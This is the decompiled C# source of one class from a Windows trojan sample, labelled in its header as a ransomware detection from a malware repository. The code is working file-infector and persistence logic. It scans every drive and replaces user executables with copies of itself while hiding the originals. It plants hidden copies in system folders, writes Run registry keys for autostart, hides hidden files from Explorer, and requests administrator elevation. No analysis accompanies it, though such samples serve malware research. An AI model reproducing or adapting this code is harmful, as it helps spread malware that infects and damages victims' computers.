// Decompiled with JetBrains decompiler
// Type: ns5.Class18
// Assembly: TRM, Version=1.0.4536.20171, Culture=neutral, PublicKeyToken=null
// MVID: CEEA56E5-11FC-4347-A0BD-C051910E6353
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.07\HEUR-Trojan-Ransom.Win32.Generic-aa3c07db34ce0641fac630d7d72f8dff24de5c64f5ff56d1a6aa57d968d452b5.exe

using Microsoft.Win32;
using ns0;
using ns1;
using ns8;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Threading;
using System.Windows.Forms;

namespace ns5
{
  internal static class Class18
  {
    private static readonly string string_0;
    private static readonly string string_1;
    public static readonly List<string> list_0;
    private static List<string> list_1;
    private static readonly string string_2 = ".exe";
    private static readonly string string_3 = "*.exe";
    private static readonly string string_4 = "fox.exe";
    private static readonly string string_5 = "foxpro.exe";
    public static readonly int int_0 = 3600000;

    static Class18()
    {
      try
      {
        char directorySeparatorChar = Path.DirectorySeparatorChar;
        Class18.string_0 = Environment.GetFolderPath(Environment.SpecialFolder.System);
        int length = Class18.string_0.LastIndexOf(directorySeparatorChar);
        Class18.string_0 = Class18.string_0.Substring(0, length).ToLower();
        Class18.string_1 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToLower();
      }
      catch
      {
      }
      Class18.list_0 = new List<string>()
      {
        Class18.string_0,
        Class18.string_1
      };
    }

    public static void smethod_0()
    {
      try
      {
        do
        {
          Class18.smethod_1();
          Thread.Sleep(Class18.int_0);
        }
        while (Class34.bool_0);
      }
      catch
      {
      }
    }

    private static void smethod_1()
    {
      string[] logicalDrives = Directory.GetLogicalDrives();
      for (int index = logicalDrives.Length - 1; index >= 0; --index)
        Class39.smethod_0(logicalDrives[index], Class18.string_3, true, (Action<List<string>>) (list_2 =>
        {
          if (!Class18.smethod_2(list_2))
          {
            foreach (string string_6 in list_2)
            {
              Class18.smethod_14(string_6);
              Thread.Sleep(600);
            }
          }
          Thread.Sleep(500);
        }), Class18.list_0);
    }

    private static bool smethod_2(List<string> list_2)
    {
      if (list_2 == null || list_2.Count == 0)
        return true;
      for (int index = 0; index < list_2.Count; ++index)
      {
        string lower = list_2[index].ToLower();
        if (lower.EndsWith(Class18.string_4) || lower.EndsWith(Class18.string_5))
          return true;
      }
      return false;
    }

    public static List<string> smethod_3()
    {
      if (Class18.list_1 != null)
        return Class18.list_1;
      string path1_1 = "";
      string path1_2 = "";
      string path1_3 = "";
      string path1_4 = "";
      string path1_5 = "c:\\windows\\";
      string path1_6 = "c:\\";
      try
      {
        path1_1 = Environment.GetFolderPath(Environment.SpecialFolder.System).ToLower();
      }
      catch
      {
      }
      try
      {
        path1_2 = Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles).ToLower();
      }
      catch
      {
      }
      try
      {
        path1_4 = Environment.GetFolderPath(Environment.SpecialFolder.CommonApplicationData).ToLower();
      }
      catch
      {
      }
      try
      {
        path1_3 = Environment.GetFolderPath(Environment.SpecialFolder.Personal).ToLower();
      }
      catch
      {
      }
      List<string> stringList = new List<string>();
      foreach (string str in Class34.string_4)
        stringList.Add(Path.Combine(path1_1, str + Class18.string_2));
      foreach (string str in Class34.string_4)
        stringList.Add(Path.Combine(path1_5, str + Class18.string_2));
      foreach (string str in Class34.string_4)
        stringList.Add(Path.Combine(path1_2, str + Class18.string_2));
      foreach (string str in Class34.string_4)
        stringList.Add(Path.Combine(path1_4, str + Class18.string_2));
      foreach (string str in Class34.string_4)
        stringList.Add(Path.Combine(path1_3, str + Class18.string_2));
      foreach (string str in Class34.string_4)
        stringList.Add(Path.Combine(path1_6, str + Class18.string_2));
      Class18.list_1 = stringList;
      return stringList;
    }

    public static void smethod_4()
    {
      try
      {
        List<string> stringList = Class18.smethod_3();
        string executablePath = Application.ExecutablePath;
        foreach (string str in stringList)
        {
          try
          {
            if (File.Exists(str))
              File.SetAttributes(str, FileAttributes.Archive);
            File.Copy(executablePath, str, true);
            if (str.StartsWith("c:\\windows\\"))
              Class30.smethod_0(str);
            else
              Class30.smethod_1(str);
            File.SetAttributes(str, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Archive);
          }
          catch (Exception ex)
          {
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static List<string> smethod_5()
    {
      List<string> stringList1 = Class18.smethod_3();
      List<string> stringList2 = new List<string>();
      foreach (string path in stringList1)
      {
        if (File.Exists(path))
          stringList2.Add(path);
      }
      return stringList2;
    }

    public static bool smethod_6()
    {
      string lower = Application.ExecutablePath.ToLower();
      string withoutExtension = Path.GetFileNameWithoutExtension(lower);
      try
      {
        if (Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", withoutExtension, (object) null).ToString().ToLower() == lower)
          return true;
      }
      catch (Exception ex)
      {
      }
      try
      {
        if (Registry.GetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", withoutExtension, (object) null).ToString().ToLower() == lower)
          return true;
      }
      catch (Exception ex)
      {
      }
      return false;
    }

    public static void smethod_7(bool bool_0)
    {
      try
      {
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion", "link", (object) Convert.ToByte(bool_0));
      }
      catch (Exception ex)
      {
      }
    }

    public static bool smethod_8()
    {
      try
      {
        return Convert.ToBoolean(Convert.ToByte(Registry.GetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion", "link", (object) Convert.ToByte(false))));
      }
      catch (Exception ex)
      {
        return false;
      }
    }

    public static void smethod_9()
    {
      try
      {
        List<string> stringList = Class18.smethod_5();
        if (stringList.Count > 0)
        {
          int num = 4;
          if (stringList.Count < 4)
            num = stringList.Count;
          for (int index = 0; index < num; ++index)
          {
            string withoutExtension = Path.GetFileNameWithoutExtension(stringList[index]);
            try
            {
              Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", withoutExtension, (object) stringList[index]);
            }
            catch (Exception ex)
            {
              try
              {
                Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", withoutExtension, (object) stringList[index]);
              }
              catch
              {
              }
            }
          }
        }
        else
        {
          string executablePath = Application.ExecutablePath;
          string withoutExtension = Path.GetFileNameWithoutExtension(executablePath);
          try
          {
            Registry.SetValue("HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", withoutExtension, (object) executablePath);
          }
          catch (Exception ex)
          {
            try
            {
              Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", withoutExtension, (object) executablePath);
            }
            catch
            {
            }
          }
        }
      }
      catch (Exception ex)
      {
      }
    }

    public static bool smethod_10()
    {
      foreach (string path in Class18.smethod_3())
      {
        if (File.Exists(path))
          return true;
      }
      return false;
    }

    public static bool smethod_11(string string_6)
    {
      string_6 = string_6.ToLower();
      return Class18.smethod_3().Contains(string_6);
    }

    public static void smethod_12(string[] args = null)
    {
      string executablePath = Application.ExecutablePath;
      string directoryName = Path.GetDirectoryName(executablePath);
      string withoutExtension = Path.GetFileNameWithoutExtension(executablePath);
      Path.GetExtension(executablePath);
      string path = Path.Combine(directoryName, withoutExtension);
      string str = Path.Combine(directoryName, withoutExtension + Class34.string_3);
      if (!File.Exists(path))
        path = str;
      if (!File.Exists(path))
        return;
      try
      {
        ProcessStartInfo startInfo = Process.GetCurrentProcess().StartInfo;
        startInfo.FileName = path;
        if (args != null)
        {
          if (args.Length > 0)
          {
            try
            {
              startInfo.Arguments = Class18.smethod_15();
            }
            catch
            {
            }
          }
        }
        startInfo.UseShellExecute = false;
        Process.Start(startInfo);
      }
      catch
      {
      }
    }

    public static void smethod_13(string directory, bool subdirectories = true) => Class39.smethod_0(directory, Class18.string_3, subdirectories, (Action<List<string>>) (list_2 =>
    {
      foreach (string string_6 in list_2)
      {
        Class18.smethod_14(string_6);
        Thread.Sleep(50);
      }
    }), Class18.list_0);

    private static void smethod_14(string string_6)
    {
      try
      {
        string executablePath = Application.ExecutablePath;
        if (Class18.smethod_11(string_6))
          return;
        string lower = string_6.ToLower();
        if (lower.ToLower().StartsWith(Class18.string_0) || lower.StartsWith(Class18.string_1))
          return;
        string directoryName = Path.GetDirectoryName(string_6);
        string withoutExtension = Path.GetFileNameWithoutExtension(string_6);
        Path.GetExtension(string_6);
        string str = Path.Combine(directoryName, withoutExtension);
        try
        {
          if (withoutExtension.ToLower().EndsWith(Class34.string_3))
            return;
          File.Move(string_6, str);
          File.Copy(executablePath, string_6, true);
          try
          {
            Class30.smethod_2(str, string_6);
          }
          catch (Exception ex)
          {
          }
          File.SetAttributes(str, FileAttributes.Hidden | FileAttributes.System | FileAttributes.Archive);
        }
        catch (Exception ex)
        {
        }
      }
      catch
      {
      }
    }

    private static string smethod_15()
    {
      try
      {
        string commandLine = Environment.CommandLine;
        string lower1 = commandLine.ToLower();
        string lower2 = Application.ExecutablePath.ToLower();
        int startIndex1 = lower1.IndexOf(lower2, StringComparison.InvariantCulture);
        if (startIndex1 != 1 || lower1[0] != '"')
          return commandLine.Substring(startIndex1, commandLine.Length - startIndex1).Trim();
        int startIndex2 = lower2.Length + 1 + 1;
        return commandLine.Substring(startIndex2, commandLine.Length - startIndex2).Trim();
      }
      catch (Exception ex)
      {
        return string.Empty;
      }
    }

    public static void smethod_16()
    {
      try
      {
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "ShowSuperHidden", (object) 0);
      }
      catch
      {
      }
      try
      {
        Registry.SetValue("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced", "Hidden", (object) 2);
      }
      catch
      {
      }
    }

    public static bool smethod_17() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

    public static void smethod_18(bool bool_0)
    {
      if (bool_0)
        Class18.ShellExecute(IntPtr.Zero, "runas", Application.ExecutablePath ?? "", Class18.smethod_15(), "", 1);
      else
        Class18.ShellExecute(IntPtr.Zero, "runas", Application.ExecutablePath ?? "", "", "", 1);
    }

    [DllImport("shell32.dll")]
    private static extern void ShellExecute(
      IntPtr intptr_0,
      string string_6,
      string string_7,
      string string_8,
      string string_9,
      int int_1);
  }
}
